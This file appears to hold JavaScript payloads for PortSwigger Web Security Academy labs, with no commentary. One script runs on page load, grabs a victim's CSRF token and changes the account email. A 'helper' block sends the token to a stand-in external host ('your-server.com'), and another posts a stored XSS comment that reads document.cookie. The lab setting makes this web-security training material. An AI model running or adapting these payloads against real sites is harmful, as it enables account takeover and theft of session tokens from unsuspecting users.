window.onload = function() {
  var getxhr = new XMLHttpRequest();
  getxhr.open("GET", "https://0a4e000903946b36801cbcee00c50045.web-security-academy.net/my-account", true);
  getxhr.onreadystatechange = function(){
    if (getxhr.readyState === 4 && getxhr.status === 200) {
      // Parse the response to extract the CSRF token
      var parser = new DOMParser();
      var doc = parser.parseFromString(getxhr.responseText, 'text/html');
      var csrfToken = doc.querySelector('input[name="csrf"]').value;
      console.log(csrfToken);

  
    
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://0a4e000903946b36801cbcee00c50045.web-security-academy.net/my-account/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

var body = "csrf=" + encodeURIComponent(csrfToken) +
           "&email=%74%65%73%74%40%74%65%73%74%2e%6e%65%74";

// Send the request
xhr.send(body);
};
};

getxhr.send();
};







```helper
  // Get the CSRF token from the input field
  var csrfToken = document.querySelector('input[name="csrf"]').value;

  // Send the CSRF token to an external server
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://your-server.com/log?token=" + csrfToken, true);
  xhr.send();



  // Step 1: Make a request to the /my-account page to grab the CSRF token
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://0a4e000903946b36801cbcee00c50045.web-security-academy.net/my-account", true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // Parse the response to extract the CSRF token
      var parser = new DOMParser();
      var doc = parser.parseFromString(xhr.responseText, 'text/html');
      var csrfToken = doc.querySelector('input[name="csrf"]').value;
      
      // Step 2: Now that we have the CSRF token, make the POST request
      var postXhr = new XMLHttpRequest();
      postXhr.open("POST", "https://0a130066037fc21783b19229006f00f6.web-security-academy.net/post/comment", true);
      postXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      
      var body = "csrf=" + encodeURIComponent(csrfToken) +
                 "&postId=3" +
                 "&comment=" + encodeURIComponent("<script>alert(document.cookie)</script>") +
                 "&name=test" +
                 "&email=s%40g" +
                 "&website=https%3A%2F%2Ff.com";
      
      // Send the POST request with the token
      postXhr.send(body);
    }
  };
  
  // Send the request to get the CSRF token
  xhr.send();
```
